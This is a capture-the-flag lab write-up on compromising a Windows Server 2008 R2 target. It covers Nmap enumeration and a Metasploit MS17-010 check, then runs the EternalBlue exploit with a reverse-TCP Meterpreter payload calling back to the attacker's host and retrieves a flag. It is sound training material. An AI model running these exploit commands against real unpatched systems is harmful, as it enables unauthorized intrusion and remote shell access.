
# Mr. Blue Walkthrough (Windows)
<img width="356" height="185" alt="Screenshot 2026-07-22 102516" src="https://github.com/user-attachments/assets/beb7491c-c835-4c6e-82b3-8a8cca75fcec" />

## Overview
In this lab, I assessed a Windows Server 2008 R2 Enterprise SP1 machine by performing service enumeration, vulnerability assessment, and exploitation. The target exposed several services including SMB, MSSQL, IIS, DNS, RDP, and Splunk. Initial reconnaissance identified a likely MS17-010 (EternalBlue) vulnerability, which became the primary attack vector.

## Tools Used
* Nmap
* Metasploit Framework

## Enumeration

### Nmap Scan

<img width="511" height="391" alt="Screenshot 2026-07-22 085329" src="https://github.com/user-attachments/assets/3faae8e2-8176-4076-9a0a-142bb0698b95" />
<img width="521" height="371" alt="Screenshot 2026-07-22 085423" src="https://github.com/user-attachments/assets/6fa2d90c-7ec6-4c13-a33f-094ede3b5658" />

```
Windows Server 2008 R2 Enterprise SP1 x64
```

---
### Web Enumeration

Visiting the web server displayed a simple page containing the text:

<img width="347" height="341" alt="Screenshot 2026-07-22 094230" src="https://github.com/user-attachments/assets/16a9fec7-8c9d-4834-a9dd-d92616d614c1" />

Additional web enumeration was performed using Gobuster and Nikto to search for hidden directories and web application components.

---

## Vulnerability Assessment

The SMB service was tested for the MS17-010 vulnerability using Metasploit.
<img width="523" height="92" alt="Screenshot 2026-07-22 091550" src="https://github.com/user-attachments/assets/15311e88-208f-4bce-b0ef-1fe51e6eca52" />

```
use auxiliary/scanner/smb/smb_ms17_010
```
The scanner reported:
```
Host is likely VULNERABLE to MS17-010
```
This confirmed that the target was susceptible to the EternalBlue vulnerability.

---

## Exploitation
The EternalBlue exploit module was loaded.

```
use exploit/windows/smb/ms17_010_eternalblue
```
<img width="520" height="338" alt="Screenshot 2026-07-22 091815" src="https://github.com/user-attachments/assets/f1585cb3-1ccb-42fe-9937-54bb10de2735" />

The exploit was configured with:

```
set RHOSTS 10.150.150.242
set LHOST <VPN_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
<img width="524" height="334" alt="Screenshot 2026-07-22 092431" src="https://github.com/user-attachments/assets/7fbc1d85-45ea-47f3-81dc-6e33efd4b962" />

<img width="511" height="296" alt="Screenshot 2026-07-22 101823" src="https://github.com/user-attachments/assets/ab881659-692b-4c1b-bfcf-f7bdb98386f3" />

Although the exploit completed the overwrite phase successfully, the Meterpreter payload did not establish a session. After further attempts and adjustments, a command shell was successfully obtained on the target system.

---

## Post Exploitation

With command execution available, the Windows file system was explored.
<img width="509" height="368" alt="Screenshot 2026-07-22 102142" src="https://github.com/user-attachments/assets/4a2f9eb0-c0c4-4882-9c51-d13f2676e0f9" />


Listing the Desktop directory revealed the flag file:

```
FLAG34.txt
```
## Skills Demonstrated
* Windows enumeration
* Network reconnaissance
* SMB vulnerability assessment
* MS17-010 (EternalBlue) detection
* Metasploit exploitation
* Windows command-line navigation
* Post-exploitation file discovery

## Lessons Learned

* Service enumeration is essential for identifying multiple attack vectors.
* MS17-010 scanners can correctly identify vulnerable systems, but successful exploitation may require adjustments to payloads or exploit parameters.
* Web applications, SMB, MSSQL, and Splunk should all be evaluated when assessing Windows servers.
* Post-exploitation navigation is critical for locating sensitive files and challenge flags.

## Conclusion

This exercise reinforced the importance of structured penetration testing methodology, beginning with reconnaissance and enumeration before moving into vulnerability assessment and exploitation. By leveraging Metasploit and Windows command-line techniques, access to the target system was achieved, allowing successful post-exploitation activities and retrieval of the target flag.
